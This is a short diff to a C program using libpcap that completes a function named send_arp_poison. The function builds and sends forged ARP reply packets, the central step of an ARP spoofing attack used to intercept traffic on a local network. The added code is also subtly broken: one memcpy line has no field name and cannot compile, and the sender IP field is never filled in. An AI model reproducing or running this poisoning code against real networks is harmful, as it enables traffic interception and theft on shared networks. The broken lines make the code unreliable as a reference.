@@ -100,7 +100,16 @@ static void send_arp_poison(pcap_t *handle, uchar *source_ip, u_char *target_ip,
     packet[12] = 0x08;
     packet[13] = 0x06;
     arpheader = (arphdr_t *)(packet + 14);
-
+    arpheader->htype = htons(1);
+    arpheader->ptype = htons(0x800);
+    arpheader->hlen = MAC_ADDR_LEN;
+    arpheader->plen = IP_ADDR_LEN;
+    arpheader->oper = htons(2);
+    memcpy(arpheader->sha, source_mac, MAC_ADDR_LEN);
+    memcpy(arpheader->tha, target_mac, MAC_ADDR_LEN);
+    memcpy(arpheader->, target_ip, IP_ADDR_LEN);
+    if (pcap_sendpacket(handle, packet, 42) != 0)
+        fprintf(stderr, "Error: error sending the ARP packet: %s\n", pcap_geterr(handle));
 }
 
 static void	check_and_start(pcap_t *handle, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
